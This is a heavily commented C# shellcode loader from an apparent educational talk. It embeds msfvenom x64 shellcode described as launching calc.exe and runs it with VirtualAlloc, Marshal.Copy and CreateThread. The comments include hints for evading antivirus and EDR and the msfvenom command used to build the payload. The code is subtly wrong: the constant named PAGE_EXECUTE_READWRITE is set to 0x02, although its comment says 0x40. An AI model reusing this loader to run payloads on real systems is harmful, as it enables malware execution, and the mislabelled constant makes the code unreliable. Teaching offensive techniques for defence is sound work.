/*
 * Author: Disc0rdantMel0dy
 * Used in "Krabby Patty's Secret Recipe - An Intro to Shellcode Running" Presentation @Neon Temple.
 * All rights are reserved.
 */

using System;
using System.Runtime.InteropServices;

/*
 * This project is a simple example of executing shellcode in C#.  This project is for demo and educational purposes only.
 * Do not execute this project unless you have explicit permission to do so.  The author takes no responsibility for its usage.
 * In other words, DON'T BE EVIL.
 */

namespace Krabby_Patty_Clean
{
    class Krabby_Patty_Documented
    {
        /*
         * Since C# is a high level language and we will need to work with lower level APIs, we have to import them from kernel32.dll.
         * These definitions allow us to work with APIs from outside of the .NET framework.
         */

        //Import VirtualAlloc from Kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        //Import CreateThread from Kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        //Import WaitforSingleObject from Kernel32.dll
        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            /*
             * The first thing we need to do for shellcode execution is to load the bytes of shellcode into our program.  The simplest way to do this is to
             * hardcode it into the source code.  This is a TERRIBLE idea, especially since the shellcode is not even encoded/encrypted.  This is get caught by even
             * the most basic AV / EDR.
             * 
             * We will paste the string representation of the bytes of our shellcode into the shellCode variable which tells the compiler to interpret it as
             * an array of bytes.
             */

            //This is a simple x64 popcalc shellcode generated from MSFVenom
            //Shellcode Generation CMD (Requires Metasploit Installed: msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=calc.exe -b "\x00\x0a\x0d" -f csharp
            byte[] shellCodeBytes = new byte[] { 
                0x48,0x31,0xc9,0x48,0x81,0xe9,
                0xdd,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
                0xbb,0x50,0xd1,0xea,0x14,0xac,0x77,0x5b,0x61,0x48,0x31,0x58,
                0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xac,0x99,0x69,
                0xf0,0x5c,0x9f,0x9b,0x61,0x50,0xd1,0xab,0x45,0xed,0x27,0x09,
                0x30,0x06,0x99,0xdb,0xc6,0xc9,0x3f,0xd0,0x33,0x30,0x99,0x61,
                0x46,0xb4,0x3f,0xd0,0x33,0x70,0x99,0x61,0x66,0xfc,0x3f,0x54,
                0xd6,0x1a,0x9b,0xa7,0x25,0x65,0x3f,0x6a,0xa1,0xfc,0xed,0x8b,
                0x68,0xae,0x5b,0x7b,0x20,0x91,0x18,0xe7,0x55,0xad,0xb6,0xb9,
                0x8c,0x02,0x90,0xbb,0x5c,0x27,0x25,0x7b,0xea,0x12,0xed,0xa2,
                0x15,0x7c,0xfc,0xdb,0xe9,0x50,0xd1,0xea,0x5c,0x29,0xb7,0x2f,
                0x06,0x18,0xd0,0x3a,0x44,0x27,0x3f,0x43,0x25,0xdb,0x91,0xca,
                0x5d,0xad,0xa7,0xb8,0x37,0x18,0x2e,0x23,0x55,0x27,0x43,0xd3,
                0x29,0x51,0x07,0xa7,0x25,0x65,0x3f,0x6a,0xa1,0xfc,0x90,0x2b,
                0xdd,0xa1,0x36,0x5a,0xa0,0x68,0x31,0x9f,0xe5,0xe0,0x74,0x17,
                0x45,0x58,0x94,0xd3,0xc5,0xd9,0xaf,0x03,0x25,0xdb,0x91,0xce,
                0x5d,0xad,0xa7,0x3d,0x20,0xdb,0xdd,0xa2,0x50,0x27,0x37,0x47,
                0x28,0x51,0x01,0xab,0x9f,0xa8,0xff,0x13,0x60,0x80,0x90,0xb2,
                0x55,0xf4,0x29,0x02,0x3b,0x11,0x89,0xab,0x4d,0xed,0x2d,0x13,
                0xe2,0xbc,0xf1,0xab,0x46,0x53,0x97,0x03,0x20,0x09,0x8b,0xa2,
                0x9f,0xbe,0x9e,0x0c,0x9e,0xaf,0x2e,0xb7,0x5c,0x16,0x76,0x5b,
                0x61,0x50,0xd1,0xea,0x14,0xac,0x3f,0xd6,0xec,0x51,0xd0,0xea,
                0x14,0xed,0xcd,0x6a,0xea,0x3f,0x56,0x15,0xc1,0x17,0x87,0xee,
                0xc3,0x06,0x90,0x50,0xb2,0x39,0xca,0xc6,0x9e,0x85,0x99,0x69,
                0xd0,0x84,0x4b,0x5d,0x1d,0x5a,0x51,0x11,0xf4,0xd9,0x72,0xe0,
                0x26,0x43,0xa3,0x85,0x7e,0xac,0x2e,0x1a,0xe8,0x8a,0x2e,0x3f,
                0x77,0xcd,0x1b,0x38,0x4f,0x35,0xa9,0x8f,0x14,0xac,0x77,0x5b,
                0x61 };


            /*             
			 * Next we will allocate memory inside our process to hold our shellcode
			 * We will use the VirtualAlloc (https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) winAPI call to accomplish this.
			 * This API call will return a pointer to the first byte of the allocated memory space.  We will save this pointer the ptrToAllocatedMemory variable.
			 */

            ////Define Constants for VirtualAlloc
            //UInt32 is the csharp equivilent to C++ DWORD.  As per documentation above flAllocationType and flProtect are expected to be in DWORD so we cast these here.
            //Access mask for MEM_COMMIT 0x1000
            UInt32 MEM_COMMIT = 0x1000;
            //Access mask for PAGE_EXECUTE_READWRITE 0x40
            UInt32 PAGE_EXECUTE_READWRITE = 0x02;

            //This is the actual API call which will allocate memory.  Its worth noting that this is a high-level API call which actually makes calls to the lower
            //level, undocumented, NtAllocateVirtualMemory API call.  This will be important to understand when you start trying to evade AV / EDR.
            IntPtr ptrAllocatedMemory = VirtualAlloc(
                //The first (optional) parameter of the API call sets where in the memory space we want the output pointer to start at.  In this case, and most cases, 
                //we will want the beginning of the allocated space.  To ensure this is the case we will set the pointer to 0 (the first byte in the array).
                //Note: The first parameter of the API call is optional but it is good practice to apply this for clarity.
                IntPtr.Zero,
                //The second (required) parameter tells the API how many bytes of memory to allocate.
                //To simplify the code we will use the built-in Length method to insert the actual length of our shellcode instead of hardcoding a length.
                (UInt32)shellCodeBytes.Length,
                //The third (required) parameter tells the API the type of allocation we want to make.  In most shellcode cases we will use MEM_COMMIT.
                MEM_COMMIT,
                //The fourth, and final, (required) parameter tells the API what memory permissions should be set in the allocated memory region.
                //In this example code we will allocate read, write, and execute (RWX) permissions.  This simplifies execution but will cause the program
                //to flag in most AV / EDR solutions.  These permissions can be allocated with something different and then changed with the VirtualProtect
                //api call to make the program look more "normal"...hint hint.
                PAGE_EXECUTE_READWRITE);

            /*
             * Now that we have memory allocated, the next thing we need to do is write our shellCode byte array into that memory region.
             * We will accomplish this with Marshal.Copy (https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-8.0).
             */
            //Marshal.Copy Syntax: public static void Copy (float[] source, int startIndex, IntPtr destination, int length);
            Marshal.Copy(
                //The first parameter expected is an array of bytes containing the source data (in our case shellCodeBytes)
                shellCodeBytes, 
                //The second expected parameter is an int index of where in the allocated memory (destination) we should start copying from.
                //Since we allocated the exact amount of memory we would need above we want to start copying from position 0, or the first byte in the memory region.
                0,
                //The third parameter expected is an IntPtr (memory pointer) to the destination we are copying to.
                //In our case it's the variable that was populated by our virtualalloc call (ptrAllocatedMemory).
                ptrAllocatedMemory, 
                //The fourth and last parameter needed is the length of the data we wish to copy (in our case the length of shellCodeBytes).
                //We can again generate this dynamically in C# by calling the length method of the byte array.
                shellCodeBytes.Length);

            /*
             * The fourth step in our loader is to set the execution instruction pointer (EIP) to the beginning of our shellcode.
             * This is just a fancy CS way of saying we are telling the program to start execution at the beginning of our shellcode.
             * In this case we will use the CreateThread API (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)  
             * which will move execution to a thread (a thread is like a sub-process in the program) to execute our shellcode.
             */

            //Declaration of the UInt32 thread ID.  This is necessary for one of the parameters in CreateThread API call. Since this is 0 the API will create the
            //threadId for us.  This allows us to avoid having to enumerate the thread ids in our process.
            UInt32 threadId = 0;
            /*
             * CreateThread Syntax
             * HANDLE CreateThread(
             *    [in, optional]  LPSECURITY_ATTRIBUTES (IntPtr)    lpThreadAttributes,
             *    [in]            SIZE_T (UInt32)                   dwStackSize,
             *    [in]            LPTHREAD_START_ROUTINE (IntPtr)   lpStartAddress,
             *    [in, optional]  __drv_aliasesMem LPVOID (IntPtr)  lpParameter,
             *    [in]            DWORD (UInt32)                    dwCreationFlags,
             *    [out, optional] LPDWORD (UInt32)                  lpThreadId
             *  );
             */
            IntPtr hThread = CreateThread(
                //The first parameter is to set specific security attributes for the thread.  In our case we set to 0 which tells the program to use the default
                //security parameters (which is to inherit from the parent process).
                IntPtr.Zero,
                //The second parameter sets the stack size.  Again we set this to zero to use the default stack size.
                0,
                //The third parameter is a pointer to the starting execution address of our thread.
                //In our case it will be the pointer to the memory space we populated with Marshal.Copy and allocated with VirtualAlloc (ptrAllocatedMemory).
                //This is how we set EIP to the start of our shellcode.
                ptrAllocatedMemory,
                //The fourth parameter is an IntPtr used to set thread parameters.  Since we do not require this to run shellcode, we set it to zero.
                IntPtr.Zero,
                //The fifth parameter is a UInt which defines creation flags.  We set this to zero to tell the operation system that this thread should run immediately.
                0,
                //The sixth and final parameter is used to define the thread ID that this thread should use.  As mentioned above we set this to 0 to allow the system
                //to define the thread id automatically.
                ref threadId);
            
            /*
             * This last line is used because we are setting EIP with a thread.  Normally, when a program finishes it will immediately exits,
             * this will kill any threads associated with it.  This WaitForSingleObject API tells the OS to allow the thread located at a specific
             * handle (hThread) to run indefinitely (0xFFFFFFFF).  
             * This is as per documentation located here: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
             */
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}